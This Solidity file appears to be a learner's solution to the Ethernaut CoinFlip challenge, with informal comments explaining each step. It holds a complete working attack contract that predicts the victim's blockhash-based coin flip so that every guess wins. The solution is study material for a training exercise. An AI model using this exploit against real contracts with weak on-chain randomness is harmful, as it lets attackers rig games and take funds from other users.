// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";      // or use interface . so you can write both contracts in one file. dont use zeppelin. zeppelein might prevent us from hacking the contract if we use it


contract CoinFlipAttack {
    CoinFlip public victimContract;   //creating var address for victim contract of type CoinFlip. this helps us grabb our victim by address
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; //this is what is used for guessing a random number
    
    constructor(address _victimContractAddr) {      //passing instrance address victim contract we created in ethernaut
        victimContract = CoinFlip(_victimContractAddr);  // initializing the var
        }
    
    function flip() public returns (bool){   // this is the func we repeat in order to get the consectuive wins. we not repeatinf the func from the legit contract
        uint256 blockValue = uint256(blockhash(block.number - 1));  //blok number converter to blokhas converted to int. the trik here is that we are using the same block number. this number matches side, thats what gives us the consistent win
        uint256 coinFlip = uint256(blockValue/ FACTOR);    //mimicking the logic from victim contract
        bool side = coinFlip == 1 ? true : false;          //if coinFlip is equal to one then its heads or true
        victimContract.flip(side);                                     // setting the guess as side. this is what makes the contract deliver the same results
    
        //successfully calculating the correct side and mimicking the logic
        //essentially we are passing over the same side over to our victim contract
        return side;
    }
    
}